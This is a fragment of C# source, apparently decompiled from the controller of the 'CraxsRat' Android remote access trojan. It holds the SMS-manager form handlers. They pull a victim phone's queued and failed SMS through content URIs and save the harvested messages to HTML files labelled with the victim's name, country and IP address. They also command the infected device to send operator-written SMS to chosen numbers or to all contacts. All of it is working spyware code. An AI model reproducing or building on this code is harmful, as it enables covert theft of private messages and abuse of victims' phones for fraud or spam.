	private void QueuedToolStripMenuItem_Click(object sender, EventArgs e)
	{
		CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb("content://sms/queued");
	}

	private void FailedToolStripMenuItem_Click(object sender, EventArgs e)
	{
		CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb("content://sms/failed");
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsjufrswas(object sender, EventArgs e)
	{
		SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
		saveFileDialog.Filter = "html (*.html)|*.html";
		if (saveFileDialog.ShowDialog() == DialogResult.OK)
			ThreadPool.QueueUserWorkItem([SpecialName] [DebuggerHidden] (object a0) =>
			{
				reso.SAVEit((Array)a0);
			}, new object[8]
			{
				DGV0,
				"null",
				saveFileDialog.FileName,
				tmpClientName,
				tmpCountry + " - " + tmpAddressIP,
				"SMS",
				"sms",
				"null"
			});
		saveFileDialog.Dispose();
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatszxcytrqa(object sender, EventArgs e)
	{
		reso.Directory_Exist(classClient);
		ThreadPool.QueueUserWorkItem([SpecialName] [DebuggerHidden] (object a0) =>
		{
			reso.SAVEit((Array)a0);
		}, new object[8]
		{
			DGV0,
			tmpFolderUSER,
			"SMS Manager",
			tmpClientName,
			tmpCountry + " - " + tmpAddressIP,
			"SMS",
			"sms",
			DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
		});
	}

	private void BoxTitle_Paint(object sender, PaintEventArgs e)
	{
		checked
		{
			if (BoxTitlePaintEventArgsWait)
			{
				int count = DGV0.Rows.Count;
				string text = "All " + Conversions.ToString(count);
				string text2 = "Selected " + Conversions.ToString(DGV0.SelectedRows.Count);
				Color defaultColor_Foreground = SpySettings.DefaultColor_Foreground;
				e.Graphics.DrawLine(new Pen(Color.FromArgb(50, defaultColor_Foreground.R, defaultColor_Foreground.G, defaultColor_Foreground.B)), 0, 1, BoxTitle.Width, 1);
				Brush brush = new SolidBrush(SpySettings.DefaultColor_Foreground);
				Brush brush2 = new SolidBrush(Color.FromArgb(170, BoxTitle.BackColor.R, BoxTitle.BackColor.G, BoxTitle.BackColor.B));
				Size size = TextRenderer.MeasureText(text + Strings.Space(10) + text2, reso.f);
				Rectangle rect = new Rectangle(0, 2, BoxTitle.Width, size.Height + 5);
				e.Graphics.FillRectangle(new Pen(brush2).Brush, rect);
				e.Graphics.DrawString(text + Strings.Space(10) + text2 + Strings.Space(10), reso.f, brush, 0f, 2f);
				Size size2 = TextRenderer.MeasureText("S", reso.f);
				if (BoxTitle.Height != size2.Height + 3)
					BoxTitle.Height = size2.Height + 3;
			}
		}
	}

	private void AngelAndroidForm_Activated(object sender, EventArgs e)
	{
		BoxTitle.Invalidate();
	}

	private void AngelAndroidForm_Deactivate(object sender, EventArgs e)
	{
		BoxTitle.Invalidate();
	}

	private void BoxTitle_Resize(object sender, EventArgs e)
	{
		BoxTitle.Invalidate();
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwsakartx(object sender, EventArgs e)
	{
		checked
		{
			try
			{
				if (classClient == null)
					return;
				smsMaker smsMaker2 = new smsMaker();
				if (smsMaker2.ShowDialog() != DialogResult.OK || smsMaker2.numslist.Items.Count <= 0)
					return;
				string text = smsMaker2.msgtext.Text;
				TcpClient myClient = classClient.myClient;
				string[] array = classClient.Keys.Split(':');
				int num = 0;
				int num2 = 0;
				if (smsMaker2.checkall.Checked)
				{
					object[] parametersObjects = new object[4]
					{
						myClient,
						SecurityKey.KeysClient2 + Data.SPL_SOCKET + "ssms<*>all<>" + text + "#" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(num) + Data.SPL_SOCKET + Conversions.ToString(num2) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
						Codes.Encoding().GetBytes("null"),
						classClient
					};
					classClient.SendMessage(parametersObjects);
				}
				else
				{
					int num3 = smsMaker2.numslist.Items.Count - 1;
					for (int i = 0; i <= num3; i++)
					{
						string text2 = Conversions.ToString(smsMaker2.numslist.Items[i]);
						if (!(string.IsNullOrEmpty(text2) | string.IsNullOrWhiteSpace(text2)))
						{
							object[] parametersObjects2 = new object[4]
							{
								myClient,
								SecurityKey.KeysClient2 + Data.SPL_SOCKET + "ssms<*>" + text2 + "#" + text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(num) + Data.SPL_SOCKET + Conversions.ToString(num2) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
								Codes.Encoding().GetBytes("null"),
								classClient
							};
							classClient.SendMessage(parametersObjects2);
						}
					}
				}
				CraxsAlert.ShowSucess("your message was sent successfully");
			}
			catch (Exception)
			{
				//ProjectData.SetProjectError(projectError);
				//////CraxsAlert.Showinformation("Sorry");
			}
		}
	}

	private void DGV0_RowsRemoved(object sender, DataGridViewRowsRemovedEventArgs e)
	{
		BoxTitle.Invalidate();
	}

	private void DGV0_RowsAdded(object sender, DataGridViewRowsAddedEventArgs e)
	{
		BoxTitle.Invalidate();
	}

	private void DGV0_SelectionChanged(object sender, EventArgs e)
	{
		BoxTitle.Invalidate();
	}
}
